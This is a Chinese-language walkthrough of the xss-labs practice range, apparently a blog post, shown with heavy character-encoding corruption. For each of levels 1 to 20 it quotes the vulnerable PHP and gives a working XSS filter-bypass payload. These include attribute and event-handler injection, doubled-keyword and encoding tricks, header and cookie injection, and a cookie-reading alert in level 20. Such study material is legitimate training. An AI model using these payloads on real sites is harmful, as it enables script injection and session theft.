é’ˆå¯¹å®¢æˆ·ç«¯çš„Webæ”»å‡»"},{"content":"XSS æŒ‘æˆ˜ä¹‹æ—… é¶åœºï¼šhttps://github.com/do0dl3/xss-labs åœ¨çº¿é¶åœºï¼šhttp://test.ctf8.com/ å‚è€ƒwpï¼šhttp://zhuabapa.top/2019/12/10/XSS%E6%8C%91%E6%88%98%E4%B9%8B%E6%97%85/ level1 æˆ‘ä»¬è§‚å¯Ÿurlå¯ä»¥å‘ç°æœ‰ä¸€ä¸ªå«åš name çš„GETå‚æ•°ï¼Œæˆ‘ä»¬ç›´æ¥ä¿®æ”¹å®ƒå°±æ˜¯å®Œæˆä¸€ä¸ªåå°„å‹XSS http://test.ctf8.com/level1.php?name=test \u0026lt;h2 align=\u0026ldquo;center\u0026rdquo;\u0026gt;æ¬¢è¿ç”¨æˆ·test\u0026lt;/h2\u0026gt; æˆ‘ä»¬é€šè¿‡é—­åˆ\u0026lt;/h2\u0026gt;å¹¶åœ¨é‡Œé¢åŠ å…¥JS \u0026lt;/h2\u0026gt;\u0026lt;script\u0026gt;alert(1)\u0026lt;/script\u0026gt; level2 level2æˆ‘ä»¬åŒæ ·è§‚å¯Ÿå‰ç«¯htmlä»£ç ï¼Œç„¶åé€šè¿‡é—­åˆinput tagçš„å†…å®¹å¼¹å‡ºJS \u0026lt;input name=\u0026#34;keyword\u0026#34; value=\u0026#34;test\u0026#34;\u0026gt; \u0026#34;\u0026gt;\u0026lt;script\u0026gt;alert(1)\u0026lt;/script\u0026gt;\u0026lt; è¿™é‡Œä¸ºä»€ä¹ˆæˆ‘ä»¬ä¸èƒ½åƒlevel1é‡Œé¢ä¸€æ ·ä½¿ç”¨ \u0026lt;h2\u0026gt; æ¥è¿›è¡Œjsçš„æ³¨å…¥å‘¢ï¼Œæˆ‘ä»¬å¯ä»¥æ¥çœ‹ä¸€ä¸‹æºç  echo \u0026#34;\u0026lt;h2 align=center\u0026gt;æ²¡æœ‰æ‰¾åˆ°å’Œ\u0026#34;.htmlspecialchars($str).\u0026#34;ç›¸å…³çš„ç»“æœ.\u0026lt;/h2\u0026gt;\u0026#34;.\u0026#39;\u0026lt;center\u0026gt; è¿™é‡Œæ˜¯ä½¿ç”¨äº†å‡½æ•° htmlspecialchars æ¥å°†ç‰¹æ®Šå­—ç¬¦è½¬æ¢ä¸ºHTMLå®ä½“ï¼ˆæ— æ³•è¢«è§£æçš„stringï¼Ÿï¼‰,å› æ­¤æ— æ³•å®Œæˆé—­åˆä¸JSä»£ç çš„æ‰§è¡Œ  \u0026amp; (ampersand) becomes \u0026amp;amp;  \u0026quot; (double quote) becomes \u0026amp;quot;  \u0026rsquo; (single quote) becomes \u0026amp;#039;  \u0026lt; (less than) becomes \u0026amp;lt;  \u0026gt; (greater than) becomes \u0026amp;gt;   level3 echo \u0026#34;\u0026lt;h2 align=center\u0026gt;æ²¡æœ‰æ‰¾åˆ°å’Œ\u0026#34;.htmlspecialchars($str).\u0026#34;ç›¸å…³çš„ç»“æœ.\u0026lt;/h2\u0026gt;\u0026#34;.\u0026#34;\u0026lt;center\u0026gt; \u0026lt;form action=level3.php method=GET\u0026gt; \u0026lt;input name=keyword value=\u0026#39;\u0026#34;.htmlspecialchars($str).\u0026#34;\u0026#39;\u0026gt; æ£€æŸ¥æºä»£ç ï¼Œå‘ç°ä¸¤è¾¹çš„$stréƒ½è¢«æ›¿æ¢äº†ï¼Œå› æ­¤æˆ‘ä»¬å¿…é¡»è¦ç»•è¿‡è¿™äº›ç‰¹æ®Šå­—ç¬¦ï¼Œåˆ©ç”¨æ ‡ç­¾å†…çš„attributeè¿›è¡Œç»•è¿‡ è¿™è¾¹å»ºè®®å¤§å®¶å¯ä»¥æ£€æŸ¥ä¸€ä¸‹ æ£€æŸ¥æºç  ä»¥åŠæµè§ˆå™¨ inspector é‡Œé¢çš„æºç çš„åŒºåˆ«ï¼Œä»¥æ£€æŸ¥æºç å¾—åˆ°çš„htmlä¸ºæ ‡å‡†ï¼Œè¿›è¡Œå¼•å·çš„é—­åˆ \u0026#39; onclick=\u0026#39;alert(1) ç„¶åè¡¥å……ä¸€ä¸‹å…³äº htmlspecialchars çš„ä½¿ç”¨ï¼Œé»˜è®¤æ˜¯ä¸è¿‡æ»¤å¼•å·çš„ï¼Œå¯ä»¥åœ¨å‚æ•°ä¸­è®¾ç½®flagæ¥è¿›è¡Œè¿‡æ»¤ï¼Œä¹Ÿå°±æ˜¯ä¸ºä»€ä¹ˆæˆ‘ä»¬åœ¨è¿™é‡Œè¿˜å¯ä»¥ä½¿ç”¨å¼•å·æ¥è¿›è¡Œç»•è¿‡ level4 æ£€æŸ¥æºç çš„å†…å®¹ï¼Œå‘ç°è¿™é‡Œå¯¹äºæ‹¬å·éƒ½è¿›è¡Œäº†æ›¿æ¢ï¼Œä½†æ˜¯è¿˜æ˜¯æ²¡æœ‰åŠ å…¥å¯¹äºå¼•å·çš„æ£€æŸ¥å’Œè½¬æ¢ï¼Œæ‰€ä»¥è¿˜æ˜¯å’Œlevel3ä¸€æ ·çš„å¥—è·¯ $str = $_GET[\u0026#34;keyword\u0026#34;]; $str2=str_replace(\u0026#34;\u0026gt;\u0026#34;,\u0026#34;\u0026#34;,$str); $str3=str_replace(\u0026#34;\u0026lt;\u0026#34;,\u0026#34;\u0026#34;,$str2); echo \u0026#34;\u0026lt;h2 align=center\u0026gt;æ²¡æœ‰æ‰¾åˆ°å’Œ\u0026#34;.htmlspecialchars($str).\u0026#34;ç›¸å…³çš„ç»“æœ.\u0026lt;/h2\u0026gt;\u0026#34;.\u0026#39;\u0026lt;center\u0026gt; \u0026lt;form action=level4.php method=GET\u0026gt; \u0026lt;input name=keyword value=\u0026#34;\u0026#39;.$str3.\u0026#39;\u0026#34;\u0026gt; è¿™æ¬¡éœ€è¦ç”¨åŒå¼•å·ï¼Œå»ºè®®å¤§å®¶å¤šåšå°è¯•ï¼Œç„¶åçœ‹ä¸€ä¸‹æºç çš„æ˜¾ç¤º \u0026#34; onclick=\u0026#34;alert(1) level5 æ£€æŸ¥æºç ï¼Œå¯¹äº \u0026lt;script\u0026gt; ä»¥åŠ on è¿›è¡Œäº†æ›¿æ¢ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±éœ€è¦æ‰¾åˆ°æ–°çš„æ³¨å…¥å§¿åŠ¿ï¼Œ $str = strtolower($_GET[\u0026#34;keyword\u0026#34;]); $str2=str_replace(\u0026#34;\u0026lt;script\u0026#34;,\u0026#34;\u0026lt;scr_ipt\u0026#34;,$str); $str3=str_replace(\u0026#34;on\u0026#34;,\u0026#34;o_n\u0026#34;,$str2); echo \u0026#34;\u0026lt;h2 align=center\u0026gt;æ²¡æœ‰æ‰¾åˆ°å’Œ\u0026#34;.htmlspecialchars($str).\u0026#34;ç›¸å…³çš„ç»“æœ.\u0026lt;/h2\u0026gt;\u0026#34;.\u0026#39;\u0026lt;center\u0026gt; \u0026lt;form action=level5.php method=GET\u0026gt; \u0026lt;input name=keyword value=\u0026#34;\u0026#39;.$str3.\u0026#39;\u0026#34;\u0026gt; æˆ‘ä»¬é€šè¿‡ç”¨ \u0026lt;a\u0026gt; ç›´æ¥å†™å…¥ä¸€ä¸ªé“¾æ¥æ¥è¿›è¡Œjsçš„æ‰§è¡Œ \u0026#34;\u0026gt; \u0026lt;a href=javascript:alert(1)\u0026gt; XSS \u0026lt;/a\u0026gt; level6 å¢åŠ äº†è¿‡æ»¤çš„tagç§ç±»ï¼Œä½†æ˜¯å¯ä»¥é€šè¿‡æ”¹å˜å¤§å°å†™ç»•è¿‡ $str2=str_replace(\u0026#34;\u0026lt;script\u0026#34;,\u0026#34;\u0026lt;scr_ipt\u0026#34;,$str); $str3=str_replace(\u0026#34;on\u0026#34;,\u0026#34;o_n\u0026#34;,$str2); $str4=str_replace(\u0026#34;src\u0026#34;,\u0026#34;sr_c\u0026#34;,$str3); $str5=str_replace(\u0026#34;data\u0026#34;,\u0026#34;da_ta\u0026#34;,$str4); $str6=str_replace(\u0026#34;href\u0026#34;,\u0026#34;hr_ef\u0026#34;,$str5); echo \u0026#34;\u0026lt;h2 align=center\u0026gt;æ²¡æœ‰æ‰¾åˆ°å’Œ\u0026#34;.htmlspecialchars($str).\u0026#34;ç›¸å…³çš„ç»“æœ.\u0026lt;/h2\u0026gt;\u0026#34;.\u0026#39;\u0026lt;center\u0026gt; \u0026lt;form action=level6.php method=GET\u0026gt; \u0026lt;input name=keyword value=\u0026#34;\u0026#39;.$str6.\u0026#39;\u0026#34;\u0026gt; \u0026#34;\u0026gt; \u0026lt;a hRef=javascript:alert(1)\u0026gt; XSS \u0026lt;/a\u0026gt; level7 åœ¨level6çš„åŸºç¡€ä¸ŠåŠ ä¸Šäº†å¤§å°å†™çš„è¿‡æ»¤ï¼Œè€æ€è·¯ï¼Œå•çº¯çš„æ›¿æ¢åˆ™å¯ä»¥åˆ©ç”¨åŒå†™ç»•è¿‡ $str =strtolower( $_GET[\u0026#34;keyword\u0026#34;]); $str2=str_replace(\u0026#34;script\u0026#34;,\u0026#34;\u0026#34;,$str); $str3=str_replace(\u0026#34;on\u0026#34;,\u0026#34;\u0026#34;,$str2); $str4=str_replace(\u0026#34;src\u0026#34;,\u0026#34;\u0026#34;,$str3); $str5=str_replace(\u0026#34;data\u0026#34;,\u0026#34;\u0026#34;,$str4); $str6=str_replace(\u0026#34;href\u0026#34;,\u0026#34;\u0026#34;,$str5); echo \u0026#34;\u0026lt;h2 align=center\u0026gt;æ²¡æœ‰æ‰¾åˆ°å’Œ\u0026#34;.htmlspecialchars($str).\u0026#34;ç›¸å…³çš„ç»“æœ.\u0026lt;/h2\u0026gt;\u0026#34;.\u0026#39;\u0026lt;center\u0026gt; \u0026lt;form action=level7.php method=GET\u0026gt; \u0026lt;input name=keyword value=\u0026#34;\u0026#39;.$str6.\u0026#39;\u0026#34;\u0026gt; æ³¨æ„ä¸€ä¸‹ï¼Œè¿™é‡Œè¿˜æœ‰ä¸€ä¸ª script éœ€è¦åŒå†™ \u0026#34;\u0026gt; \u0026lt;a hrhrefef=javascscriptript:alert(1)\u0026gt; XSS \u0026lt;/a\u0026gt; level8 åœ¨level7çš„åŸºç¡€ä¸Šï¼Œå¢åŠ äº†åŒå¼•å·çš„è¿‡æ»¤ï¼ŒåŒæ—¶åŠ å…¥ä¸‹åˆ’çº¿å¯¹tagè¿›è¡Œç ´å $str = strtolower($_GET[\u0026#34;keyword\u0026#34;]); $str2=str_replace(\u0026#34;script\u0026#34;,\u0026#34;scr_ipt\u0026#34;,$str); $str3=str_replace(\u0026#34;on\u0026#34;,\u0026#34;o_n\u0026#34;,$str2); $str4=str_replace(\u0026#34;src\u0026#34;,\u0026#34;sr_c\u0026#34;,$str3); $str5=str_replace(\u0026#34;data\u0026#34;,\u0026#34;da_ta\u0026#34;,$str4); $str6=str_replace(\u0026#34;href\u0026#34;,\u0026#34;hr_ef\u0026#34;,$str5); $str7=str_replace(\u0026#39;\u0026#34;\u0026#39;,\u0026#39;\u0026amp;quot\u0026#39;,$str6); echo \u0026#39;\u0026lt;center\u0026gt; \u0026lt;form action=level8.php method=GET\u0026gt; \u0026lt;input name=keyword value=\u0026#34;\u0026#39;.htmlspecialchars($str).\u0026#39;\u0026#34;\u0026gt; \u0026lt;input type=submit name=submit value=æ·»åŠ å‹æƒ…é“¾æ¥ /\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;/center\u0026gt;\u0026#39;; ?\u0026gt;\u0026lt;?php echo \u0026#39;\u0026lt;center\u0026gt;\u0026lt;BR\u0026gt;\u0026lt;a href=\u0026#34;\u0026#39;.$str7.\u0026#39;\u0026#34;\u0026gt;å‹æƒ…é“¾æ¥\u0026lt;/a\u0026gt;\u0026lt;/center\u0026gt;\u0026#39; æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ %09 è¿›è¡Œæ¢è¡Œæ¥é¿å…ä¸‹åˆ’çº¿ï¼Œä½†æ˜¯ä¸èƒ½åœ¨è¾“å…¥æ¡†å†…å®Œæˆï¼Œéœ€è¦æ”¾åœ¨urlä¸­æ‰èƒ½è¢«æ­£å¸¸è§£æ keyword=javascr%09ipt:alert(1) å¯ä»¥ä½¿ç”¨htmlç¼–ç  \u0026amp;#106;\u0026amp;#97;\u0026amp;#118;\u0026amp;#97;\u0026amp;#115;\u0026amp;#99;\u0026amp;#114;\u0026amp;#105;\u0026amp;#112;\u0026amp;#116;\u0026amp;#58;\u0026amp;#97;\u0026amp;#108;\u0026amp;#101;\u0026amp;#114;\u0026amp;#116;\u0026amp;#40;\u0026amp;#49;\u0026amp;#41; level9 åœ¨level8çš„åŸºç¡€ä¸ŠåŠ å…¥äº†å¯¹äºurlçš„å®¡æ ¸ï¼Œä½†æ˜¯åªæ£€æŸ¥æ˜¯å¦å­˜åœ¨ http:// ,æ”¾åˆ°alertçš„å†…å®¹å³å¯ $str = strtolower($_GET[\u0026#34;keyword\u0026#34;]); $str2=str_replace(\u0026#34;script\u0026#34;,\u0026#34;scr_ipt\u0026#34;,$str); $str3=str_replace(\u0026#34;on\u0026#34;,\u0026#34;o_n\u0026#34;,$str2); $str4=str_replace(\u0026#34;src\u0026#34;,\u0026#34;sr_c\u0026#34;,$str3); $str5=str_replace(\u0026#34;data\u0026#34;,\u0026#34;da_ta\u0026#34;,$str4); $str6=str_replace(\u0026#34;href\u0026#34;,\u0026#34;hr_ef\u0026#34;,$str5); $str7=str_replace(\u0026#39;\u0026#34;\u0026#39;,\u0026#39;\u0026amp;quot\u0026#39;,$str6); echo \u0026#39;\u0026lt;center\u0026gt; \u0026lt;form action=level9.php method=GET\u0026gt; \u0026lt;input name=keyword value=\u0026#34;\u0026#39;.htmlspecialchars($str).\u0026#39;\u0026#34;\u0026gt; \u0026lt;input type=submit name=submit value=æ·»åŠ å‹æƒ…é“¾æ¥ /\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;/center\u0026gt;\u0026#39;; ?\u0026gt;\u0026lt;?php if(false===strpos($str7,\u0026#39;http://\u0026#39;)) { echo \u0026#39;\u0026lt;center\u0026gt;\u0026lt;BR\u0026gt;\u0026lt;a href=\u0026#34;æ‚¨çš„é“¾æ¥ä¸åˆæ³•ï¼Ÿæœ‰æ²¡æœ‰ï¼\u0026#34;\u0026gt;å‹æƒ…é“¾æ¥\u0026lt;/a\u0026gt;\u0026lt;/center\u0026gt;\u0026#39;; } else { echo \u0026#39;\u0026lt;center\u0026gt;\u0026lt;BR\u0026gt;\u0026lt;a href=\u0026#34;\u0026#39;.$str7.\u0026#39;\u0026#34;\u0026gt;å‹æƒ…é“¾æ¥\u0026lt;/a\u0026gt;\u0026lt;/center\u0026gt;\u0026#39;; } ?\u0026gt; ?keyword=javascr%09ipt:alert(\u0026#39;http://\u0026#39;)\u0026amp;submit=æ·»åŠ å‹æƒ…é“¾æ¥ level10 æˆ‘ä»¬ä»”ç»†çœ‹æºç ï¼Œè™½ç„¶åœ¨keywordè¿™é‡Œåšäº†æ‹¬å·çš„æ›¿æ¢ï¼Œå¯¼è‡´æ— æ³•é—­åˆ \u0026lt;h2\u0026gt; ä½†æ˜¯è¿™é‡Œè¿˜æœ‰ä¸€ä¸ªt_sortå¯ä»¥åˆ©ç”¨ï¼Œæˆ‘ä»¬è¦åšçš„å°±æ˜¯æ’å…¥JSï¼ŒåŒæ—¶è®©è¿™ä¸ªéšè—çš„è¾“å…¥æ¡†å‡ºç°å¯ä»¥è¢«ç‚¹å‡» $str = $_GET[\u0026#34;keyword\u0026#34;]; $str11 = $_GET[\u0026#34;t_sort\u0026#34;]; $str22=str_replace(\u0026#34;\u0026gt;\u0026#34;,\u0026#34;\u0026#34;,$str11); $str33=str_replace(\u0026#34;\u0026lt;\u0026#34;,\u0026#34;\u0026#34;,$str22); echo \u0026#34;\u0026lt;h2 align=center\u0026gt;æ²¡æœ‰æ‰¾åˆ°å’Œ\u0026#34;.htmlspecialchars($str).\u0026#34;ç›¸å…³çš„ç»“æœ.\u0026lt;/h2\u0026gt;\u0026#34;.\u0026#39;\u0026lt;center\u0026gt; \u0026lt;form id=search\u0026gt; \u0026lt;input name=\u0026#34;t_link\u0026#34; value=\u0026#34;\u0026#39;.\u0026#39;\u0026#34; type=\u0026#34;hidden\u0026#34;\u0026gt; \u0026lt;input name=\u0026#34;t_history\u0026#34; value=\u0026#34;\u0026#39;.\u0026#39;\u0026#34; type=\u0026#34;hidden\u0026#34;\u0026gt; \u0026lt;input name=\u0026#34;t_sort\u0026#34; value=\u0026#34;\u0026#39;.$str33.\u0026#39;\u0026#34; type=\u0026#34;hidden\u0026#34;\u0026gt; æ³¨æ„è¦ç”¨åŒå¼•å· \u0026amp;t_sort=\u0026#34; type=\u0026#34;text\u0026#34; onclick=\u0026#34;alert(1) level11 é€šè¿‡è§‚å¯Ÿæºç æˆ‘ä»¬å‘ç°level10ä¸­çš„t_sortä¹Ÿæ— æ³•é—­åˆäº†ï¼Œä½†æ˜¯å‡ºç°äº†éœ€è¦ä¿®æ”¹çš„HTTP-REFERERæ¥å®Œæˆæ³¨å…¥ $str = $_GET[\u0026#34;keyword\u0026#34;]; $str00 = $_GET[\u0026#34;t_sort\u0026#34;]; $str11=$_SERVER[\u0026#39;HTTP_REFERER\u0026#39;]; $str22=str_replace(\u0026#34;\u0026gt;\u0026#34;,\u0026#34;\u0026#34;,$str11); $str33=str_replace(\u0026#34;\u0026lt;\u0026#34;,\u0026#34;\u0026#34;,$str22); echo \u0026#34;\u0026lt;h2 align=center\u0026gt;æ²¡æœ‰æ‰¾åˆ°å’Œ\u0026#34;.htmlspecialchars($str).\u0026#34;ç›¸å…³çš„ç»“æœ.\u0026lt;/h2\u0026gt;\u0026#34;.\u0026#39;\u0026lt;center\u0026gt; \u0026lt;form id=search\u0026gt; \u0026lt;input name=\u0026#34;t_link\u0026#34; value=\u0026#34;\u0026#39;.\u0026#39;\u0026#34; type=\u0026#34;hidden\u0026#34;\u0026gt; \u0026lt;input name=\u0026#34;t_history\u0026#34; value=\u0026#34;\u0026#39;.\u0026#39;\u0026#34; type=\u0026#34;hidden\u0026#34;\u0026gt; \u0026lt;input name=\u0026#34;t_sort\u0026#34; value=\u0026#34;\u0026#39;.htmlspecialchars($str00).\u0026#39;\u0026#34; type=\u0026#34;hidden\u0026#34;\u0026gt; \u0026lt;input name=\u0026#34;t_ref\u0026#34; value=\u0026#34;\u0026#39;.$str33.\u0026#39;\u0026#34; type=\u0026#34;hidden\u0026#34;\u0026gt;  HTTP_USER_AGENT: \u0026#34; type=\u0026#34;text\u0026#34; onclick=\u0026#34;alert(1) level12 ä¸level11ä¸€æ ·çš„å¥—è·¯ï¼Œåªä¸è¿‡æ˜¯æ¢ä¸€ä¸ªheaderç½¢äº†ï¼Œç„¶ååˆ«å¿˜äº†æ˜¾ç¤ºè¾“å…¥æ¡† $str = $_GET[\u0026#34;keyword\u0026#34;]; $str00 = $_GET[\u0026#34;t_sort\u0026#34;]; $str11=$_SERVER[\u0026#39;HTTP_USER_AGENT\u0026#39;]; $str22=str_replace(\u0026#34;\u0026gt;\u0026#34;,\u0026#34;\u0026#34;,$str11); $str33=str_replace(\u0026#34;\u0026lt;\u0026#34;,\u0026#34;\u0026#34;,$str22); echo \u0026#34;\u0026lt;h2 align=center\u0026gt;æ²¡æœ‰æ‰¾åˆ°å’Œ\u0026#34;.htmlspecialchars($str).\u0026#34;ç›¸å…³çš„ç»“æœ.\u0026lt;/h2\u0026gt;\u0026#34;.\u0026#39;\u0026lt;center\u0026gt; \u0026lt;form id=search\u0026gt; \u0026lt;input name=\u0026#34;t_link\u0026#34; value=\u0026#34;\u0026#39;.\u0026#39;\u0026#34; type=\u0026#34;hidden\u0026#34;\u0026gt; \u0026lt;input name=\u0026#34;t_history\u0026#34; value=\u0026#34;\u0026#39;.\u0026#39;\u0026#34; type=\u0026#34;hidden\u0026#34;\u0026gt; \u0026lt;input name=\u0026#34;t_sort\u0026#34; value=\u0026#34;\u0026#39;.htmlspecialchars($str00).\u0026#39;\u0026#34; type=\u0026#34;hidden\u0026#34;\u0026gt; \u0026lt;input name=\u0026#34;t_ua\u0026#34; value=\u0026#34;\u0026#39;.$str33.\u0026#39;\u0026#34; type=\u0026#34;hidden\u0026#34;\u0026gt;  User-Agent:\u0026#34; type=\u0026#34;text\u0026#34; onclick=\u0026#34;alert(1) level13 ä¿®æ”¹cookie setcookie(\u0026#34;user\u0026#34;, \u0026#34;call me maybe?\u0026#34;, time()+3600); ini_set(\u0026#34;display_errors\u0026#34;, 0); $str = $_GET[\u0026#34;keyword\u0026#34;]; $str00 = $_GET[\u0026#34;t_sort\u0026#34;]; $str11=$_COOKIE[\u0026#34;user\u0026#34;]; $str22=str_replace(\u0026#34;\u0026gt;\u0026#34;,\u0026#34;\u0026#34;,$str11); $str33=str_replace(\u0026#34;\u0026lt;\u0026#34;,\u0026#34;\u0026#34;,$str22); echo \u0026#34;\u0026lt;h2 align=center\u0026gt;æ²¡æœ‰æ‰¾åˆ°å’Œ\u0026#34;.htmlspecialchars($str).\u0026#34;ç›¸å…³çš„ç»“æœ.\u0026lt;/h2\u0026gt;\u0026#34;.\u0026#39;\u0026lt;center\u0026gt; \u0026lt;form id=search\u0026gt; \u0026lt;input name=\u0026#34;t_link\u0026#34; value=\u0026#34;\u0026#39;.\u0026#39;\u0026#34; type=\u0026#34;hidden\u0026#34;\u0026gt; \u0026lt;input name=\u0026#34;t_history\u0026#34; value=\u0026#34;\u0026#39;.\u0026#39;\u0026#34; type=\u0026#34;hidden\u0026#34;\u0026gt; \u0026lt;input name=\u0026#34;t_sort\u0026#34; value=\u0026#34;\u0026#39;.htmlspecialchars($str00).\u0026#39;\u0026#34; type=\u0026#34;hidden\u0026#34;\u0026gt; \u0026lt;input name=\u0026#34;t_cook\u0026#34; value=\u0026#34;\u0026#39;.$str33.\u0026#39;\u0026#34; type=\u0026#34;hidden\u0026#34;\u0026gt;  Cookie: user=\u0026#34; type=\u0026#34;text\u0026#34; onclick=\u0026#34;alert(1) level14 æ²¡æœ‰æ­£å¸¸åŠ è½½æš‚ä¸”æç½® level15 \u0026lt;?php ini_set(\u0026#34;display_errors\u0026#34;, 0); $str = $_GET[\u0026#34;src\u0026#34;]; echo \u0026#39;\u0026lt;body\u0026gt;\u0026lt;span class=\u0026#34;ng-include:\u0026#39;.htmlspecialchars($str).\u0026#39;\u0026#34;\u0026gt;\u0026lt;/span\u0026gt;\u0026lt;/body\u0026gt;\u0026#39;; ?\u0026gt;AngularJS ng-include å‡½æ•°å¯ä»¥ç”¨äºåµŒå…¥html æˆ‘ä»¬é€šè¿‡åµŒå…¥level1çš„å†…å®¹ï¼ŒåŒæ ·å¯ä»¥æ‰§è¡Œæƒ³è¦çš„ä»£ç ï¼Œè¿™é‡Œè¦æ³¨æ„è¿‡æ»¤äº†æ‹¬å·ï¼Œæ‰€ä»¥è¦æ”¹å˜æˆ‘ä»¬åŸæ¥ç”¨åœ¨level1çš„payload ?src=\u0026#39;level1.php?name=\u0026lt;img src=x onerror=alert(1)\u0026gt;\u0026#39; level16 è§‚å¯Ÿæºç æˆ‘ä»¬å¯ä»¥å‘ç°level16å¯¹äºå¾ˆå¤šç‰¹æ®Šå­—ç¬¦éƒ½åšäº†æ›¿æ¢ $str = strtolower($_GET[\u0026#34;keyword\u0026#34;]); $str2=str_replace(\u0026#34;script\u0026#34;,\u0026#34;\u0026amp;nbsp;\u0026#34;,$str); $str3=str_replace(\u0026#34; \u0026#34;,\u0026#34;\u0026amp;nbsp;\u0026#34;,$str2); $str4=str_replace(\u0026#34;/\u0026#34;,\u0026#34;\u0026amp;nbsp;\u0026#34;,$str3); $str5=str_replace(\u0026#34;\t\u0026#34;,\u0026#34;\u0026amp;nbsp;\u0026#34;,$str4); echo \u0026#34;\u0026lt;center\u0026gt;\u0026#34;.$str5.\u0026#34;\u0026lt;/center\u0026gt;\u0026#34;; ?\u0026gt;\u0026lt;center\u0026gt;\u0026lt;img src=level16.png\u0026gt;\u0026lt;/center\u0026gt; \u0026lt;?php echo \u0026#34;\u0026lt;h3 align=center\u0026gt;payloadçš„é•¿åº¦:\u0026#34;.strlen($str5).\u0026#34;\u0026lt;/h3\u0026gt;\u0026#34;; ?\u0026gt; æˆ‘ä»¬å¯ä»¥ç”¨htmlç¼–ç æ¥ç»•è¿‡ï¼Œä½†æ˜¯ä¹‹å‰çš„æ–¹å¼éƒ½éœ€è¦é—­åˆ \u0026lt;h3\u0026gt; ï¼Œä½†ç°åœ¨æ–œæ è¢«è¿‡æ»¤ï¼Œæˆ‘ä»¬åªèƒ½é‡‡å–ä¸€ç§æ–°çš„æ–¹æ³•ï¼Œå°±æ˜¯æˆ‘ä»¬ç”¨åœ¨level15ä¸­çš„ img tag keyword=\u0026lt;img%0asrc=1%0aonerror=alert(1)\u0026gt; level17 \u0026lt;?php ini_set(\u0026#34;display_errors\u0026#34;, 0); echo \u0026#34;\u0026lt;embed src=xsf01.swf?\u0026#34;.htmlspecialchars($_GET[\u0026#34;arg01\u0026#34;]).\u0026#34;=\u0026#34;.htmlspecialchars($_GET[\u0026#34;arg02\u0026#34;]).\u0026#34; width=100% heigth=100%\u0026gt;\u0026#34;; ?\u0026gt;embedæ ‡ç­¾å¯ä»¥åµŒå…¥swfæ–‡ä»¶ï¼ˆflashï¼‰ è®¾ç½®ä¸€ä¸ªonmouseoveräº‹ä»¶ï¼Œé¼ æ ‡æ”¾åˆ°ä¸Šé¢å³å¯ï¼Œfirefoxç¡®å®è¯•ä¸å‡ºæ¥ï¼Œchromeå¯ä»¥ï¼Œåº”è¯¥æ˜¯æŸç§å®‰å…¨æœºåˆ¶ ?arg01=a\u0026amp;arg02=%20onmouseover=alert(1) level18 level18åœ¨level17çš„åŸºç¡€ä¸ŠåŠ äº†ç‰¹æ®Šå­—ç¬¦çš„è¿‡æ»¤ï¼Œä½†æ˜¯æˆ‘ä»¬åŸæœ¬çš„payloadä¹Ÿå¤Ÿç”¨äº† \u0026lt;?php ini_set(\u0026#34;display_errors\u0026#34;, 0); echo \u0026#34;\u0026lt;embed src=xsf02.swf?\u0026#34;.htmlspecialchars($_GET[\u0026#34;arg01\u0026#34;]).\u0026#34;=\u0026#34;.htmlspecialchars($_GET[\u0026#34;arg02\u0026#34;]).\u0026#34; width=100% heigth=100%\u0026gt;\u0026#34;; ?\u0026gt;?arg01=a\u0026amp;arg02=%20onmouseover=alert(1) level19 \u0026lt;?php ini_set(\u0026#34;display_errors\u0026#34;, 0); echo \u0026#39;\u0026lt;embed src=\u0026#34;xsf03.swf?\u0026#39;.htmlspecialchars($_GET[\u0026#34;arg01\u0026#34;]).\u0026#34;=\u0026#34;.htmlspecialchars($_GET[\u0026#34;arg02\u0026#34;]).\u0026#39;\u0026#34; width=100% heigth=100%\u0026gt;\u0026#39;; ?\u0026gt;ä½¿ç”¨å·¥å…·jpexs-decompiler å¯¹xsf03.swf flashæ–‡ä»¶è¿›è¡Œåæ±‡ç¼–ï¼Œæ‰¾åˆ°å¯ä»¥æ”¾å…¥xssæ³¨å…¥ä»£ç çš„åœ°æ–¹ é¦–å…ˆå®šä½åˆ°å‡½æ•°getURLï¼Œè¿™é‡Œåº”è¯¥æ˜¯ä¼šè·å–å½“å‰ç½‘é¡µçš„url  versionçš„å†…å®¹å¯ä»¥å†³å®š loc4_ çš„å€¼  æ£€æµ‹åˆ°åˆ \u0026lt;a\u0026gt; å½¢æˆçš„linkæ‰ä¼šæ‰§è¡Œ  å®è¯å®è¯´è¿™é‡Œæˆ‘ç¡®å®ä¹Ÿæ²¡æ€ä¹ˆææ‡‚ï¼Œjpexs-decompilerå¤§æ¦‚å°±æ˜¯ä¸€ä¸ªå’Œidaå·®ä¸å¤šçš„å†…å®¹ï¼Œé€šè¿‡åæ±‡ç¼–flashæ–‡ä»¶ï¼Œç„¶åè¡¨è¾¾æˆæˆ‘ä»¬çœ‹å¾—æ‡‚çš„è¯­è¨€ã€‚ è¿™é‡Œçš„è¯æ„Ÿè§‰å°±æ˜¯ arg01 ï¼Œ arg02 èƒ½å¤Ÿå½¢æˆä¸€å¯¹flashå‚æ•°çš„é”®å€¼å¯¹ï¼Œä»è€Œå¯¹flashçš„è¿è¡Œé€ æˆä¸€äº›å½±å“ é‚£ä¹ˆè¿™é‡Œå°±æ˜¯å¦‚æœè®¾ç½®äº†versionçš„å€¼å°±ä¼šå¼•å‘ä¸€äº›å‚æ•°è°ƒç”¨ï¼Œä»è€Œä½¿æˆ‘ä»¬æ³¨å…¥çš„è„šæœ¬èƒ½å¤Ÿè¢«æ‰§è¡Œã€‚ å¦‚æœæœ‰è¯´é”™çš„åœ°æ–¹å¸Œæœ›å„ä½å¸ˆå‚…åœ¨è¯„è®ºåŒºçº æ­£å’Œåˆ†äº«æ­£ç¡®çš„æ€è·¯ï¼Œæˆ‘å¯¹è¿™æ–¹é¢ä¸ç†Ÿæ‚‰ï¼Œè¿™é‡Œèµ°ä¸ªæµç¨‹äº†è§£ä¸€ä¸‹å·¥å…·ã€‚ å®é™…å®éªŒåœ¨æœ¬åœ°ä»¥åŠç½‘é¡µç«¯åŒ…æ‹¬firefoxï¼Œchromeä¹Ÿæ²¡æœ‰æˆåŠŸï¼Œè¿˜æ˜¯è´´ä¸€ä¸‹æ™šä¸Šçš„payload arg01=version\u0026amp;arg02=\u0026lt;a href=\u0026#34;javascript:alert(1)\u0026#34;\u0026gt;123\u0026lt;/a\u0026gt; level20 è¿˜æ˜¯è´´ä¸€ä¸‹ç½‘ä¸Šçš„payload level20.php?arg01=a\u0026amp;arg02=\\\u0026#34;))}catch(e){}if(!self.a)self.a=!alert(document.cookie)//%26width%26height 